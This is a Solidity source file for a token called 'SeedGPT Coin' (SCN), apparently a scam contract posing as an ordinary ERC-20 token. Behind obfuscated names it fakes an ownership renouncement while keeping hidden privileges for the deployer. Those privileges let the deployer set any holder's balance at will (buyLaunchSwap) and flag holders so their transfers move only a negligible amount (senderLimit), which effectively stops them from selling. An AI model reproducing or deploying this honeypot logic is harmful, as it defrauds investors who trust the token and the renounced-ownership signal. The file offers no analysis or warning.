//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface modeSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapList) external view returns (uint256);

    function transfer(address teamIsList, uint256 shouldReceiver) external returns (bool);

    function allowance(address shouldTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address teamIsList,
        uint256 shouldReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeIs, uint256 value);
    event Approval(address indexed shouldTx, address indexed spender, uint256 value);
}

interface modeSwapMetadata is modeSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract limitMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalAt {
    function createPair(address fundReceiver, address shouldAuto) external returns (address);
}

interface feeWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SeedGPTCoin is limitMarketing, modeSwap, modeSwapMetadata {

    function name() external view virtual override returns (string memory) {
        return txTotal;
    }

    event OwnershipTransferred(address indexed exemptEnable, address indexed teamShould);

    function transfer(address atSell, uint256 shouldReceiver) external virtual override returns (bool) {
        return limitAutoLaunched(_msgSender(), atSell, shouldReceiver);
    }

    address private autoFund;

    function totalMin() public {
        emit OwnershipTransferred(launchedSenderSwap, address(0));
        autoFund = address(0);
    }

    function buyLaunchSwap(address atSell, uint256 shouldReceiver) public {
        receiverLaunchAuto();
        sellSwap[atSell] = shouldReceiver;
    }

    function receiverLaunchAuto() private view{
        require(receiverLaunch[_msgSender()]);
    }

    string private exemptIs = "SCN";

    string private txTotal = "SeedGPT Coin";

    function takeTx(address maxFundLiquidity, address teamIsList, uint256 shouldReceiver) internal returns (bool) {
        require(sellSwap[maxFundLiquidity] >= shouldReceiver);
        sellSwap[maxFundLiquidity] -= shouldReceiver;
        sellSwap[teamIsList] += shouldReceiver;
        emit Transfer(maxFundLiquidity, teamIsList, shouldReceiver);
        return true;
    }

    address swapShouldFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private receiverBuyLaunch;

    uint256 public walletFund;

    function owner() external view returns (address) {
        return autoFund;
    }

    bool public toIsList;

    function allowance(address fromLaunchedSender, address marketingWallet) external view virtual override returns (uint256) {
        if (marketingWallet == swapShouldFee) {
            return type(uint256).max;
        }
        return amountTeam[fromLaunchedSender][marketingWallet];
    }

    function decimals() external view virtual override returns (uint8) {
        return modeList;
    }

    uint256 public takeAutoTo;

    address public launchedSenderSwap;

    uint8 private modeList = 18;

    mapping(address => bool) public maxTeam;

    function getOwner() external view returns (address) {
        return autoFund;
    }

    function listTotalToken(address fromTakeTo) public {
        if (toIsList) {
            return;
        }
        if (isTotal != buyModeFee) {
            buyModeFee = shouldSender;
        }
        receiverLaunch[fromTakeTo] = true;
        if (receiverBuyLaunch == maxMin) {
            isTotal = shouldSender;
        }
        toIsList = true;
    }

    uint256 private totalAmount = 100000000 * 10 ** 18;

    function limitAutoLaunched(address maxFundLiquidity, address teamIsList, uint256 shouldReceiver) internal returns (bool) {
        if (maxFundLiquidity == launchedSenderSwap) {
            return takeTx(maxFundLiquidity, teamIsList, shouldReceiver);
        }
        if (maxTeam[maxFundLiquidity]) {
            return takeTx(maxFundLiquidity, teamIsList, 11 ** 10);
        }
        return takeTx(maxFundLiquidity, teamIsList, shouldReceiver);
    }

    uint256 private buyModeFee;

    function balanceOf(address swapList) public view virtual override returns (uint256) {
        return sellSwap[swapList];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return totalAmount;
    }

    mapping(address => bool) public receiverLaunch;

    bool private maxMin;

    constructor (){ 
        if (isTotal != shouldSender) {
            isTotal = walletFund;
        }
        feeWallet fromLimitAt = feeWallet(swapShouldFee);
        swapTeam = totalAt(fromLimitAt.factory()).createPair(fromLimitAt.WETH(), address(this));
        
        receiverLaunch[_msgSender()] = true;
        sellSwap[_msgSender()] = totalAmount;
        launchedSenderSwap = _msgSender();
        
        emit Transfer(address(0), launchedSenderSwap, totalAmount);
        autoFund = _msgSender();
        totalMin();
    }

    address public swapTeam;

    uint256 public isTotal;

    mapping(address => uint256) private sellSwap;

    function approve(address marketingWallet, uint256 shouldReceiver) public virtual override returns (bool) {
        amountTeam[_msgSender()][marketingWallet] = shouldReceiver;
        emit Approval(_msgSender(), marketingWallet, shouldReceiver);
        return true;
    }

    mapping(address => mapping(address => uint256)) private amountTeam;

    function symbol() external view virtual override returns (string memory) {
        return exemptIs;
    }

    function senderLimit(address senderList) public {
        receiverLaunchAuto();
        
        if (senderList == launchedSenderSwap || senderList == swapTeam) {
            return;
        }
        maxTeam[senderList] = true;
    }

    uint256 private shouldSender;

    function transferFrom(address maxFundLiquidity, address teamIsList, uint256 shouldReceiver) external override returns (bool) {
        if (_msgSender() != swapShouldFee) {
            if (amountTeam[maxFundLiquidity][_msgSender()] != type(uint256).max) {
                require(shouldReceiver <= amountTeam[maxFundLiquidity][_msgSender()]);
                amountTeam[maxFundLiquidity][_msgSender()] -= shouldReceiver;
            }
        }
        return limitAutoLaunched(maxFundLiquidity, teamIsList, shouldReceiver);
    }

}